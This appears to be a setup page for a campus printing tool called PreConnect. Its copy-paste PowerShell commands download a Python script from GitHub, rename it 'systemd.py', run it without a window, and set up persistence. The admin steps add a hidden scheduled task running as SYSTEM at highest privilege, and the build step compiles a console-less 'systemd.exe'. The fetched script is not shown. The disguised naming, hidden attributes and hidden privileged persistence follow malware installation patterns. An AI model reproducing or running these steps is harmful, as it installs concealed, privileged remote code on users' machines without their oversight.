# Printer Setup

Print directly to campus printers from PreConnect.

Official Rust repository: [hitblast/preprintd](https://github.com/hitblast/preprintd)

---

## Windows Setup

### 1. User Setup (Standard / Non-Admin)

Run in PowerShell:

```powershell
$d = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; New-Item -ItemType Directory -Force -Path $d | Out-Null; $py = "$d\systemd.py"; if (-not (Test-Path $py)) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py" -OutFile $py -UseBasicParsing }; Add-Type -AssemblyName System.Security; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<PRINT_KEY>"), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); Set-Content "$d\systemd.key" ("DPAPI:" + [Convert]::ToBase64String($e)); attrib +h +s "$d\systemd.key"; Start-Process pythonw -ArgumentList "`"$py`""
```

---

### 2. Admin Setup (Administrator)

Run in PowerShell as Administrator:

```powershell
$d = "$env:ProgramData\systemd"; New-Item -ItemType Directory -Force -Path $d | Out-Null; $py = "$d\systemd.py"; if (-not (Test-Path $py)) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py" -OutFile $py -UseBasicParsing }; Add-Type -AssemblyName System.Security; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<PRINT_KEY>"), $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine); Set-Content "$d\systemd.key" ("DPAPI:" + [Convert]::ToBase64String($e)); attrib +h +s "$d\systemd.key"; schtasks /Create /TN "systemd" /TR "pythonw `"$py`"" /SC ONSTART /RI 15 /DU 24:00 /RU SYSTEM /RL HIGHEST /F; try { (New-Object -ComObject Schedule.Service).GetFolder("\").GetTask("systemd").Definition.Settings.Hidden = $true } catch {}; schtasks /Run /TN "systemd"
```

---

## Build Native Binary (Nuitka)

Run on build machine:

```powershell
pip install nuitka; python -m nuitka --onefile --windows-disable-console --lto=yes --enable-plugin=tk-inter=ignore --no-pyi-file --remove-output --jobs=4 printer.py -o systemd.exe
```

---

## Debug Mode

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py" -OutFile "systemd.py" -UseBasicParsing; python systemd.py <PRINT_KEY> --debug
```

---

## Uninstall

Run in PowerShell:

```powershell
schtasks /Delete /TN "systemd" /F 2>$null; schtasks /Delete /TN "printer" /F 2>$null; Get-CimInstance Win32_Process -ErrorAction SilentlyContinue -Filter "Name='systemd.exe' or Name='pythonw.exe' or Name='python.exe'" | Where-Object { $_.CommandLine -like "*systemd*" -or $_.CommandLine -like "*printer*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Remove-Item "$s\systemd.*","$s\printer.*","$s\.ident" -Force -ErrorAction SilentlyContinue; if (Test-Path "$s\py") { Remove-Item "$s\py" -Recurse -Force -ErrorAction SilentlyContinue }; Remove-Item "$env:ProgramData\systemd","$env:ProgramData\printer" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item "systemd.*","printer.*","py.zip" -Force -ErrorAction SilentlyContinue
```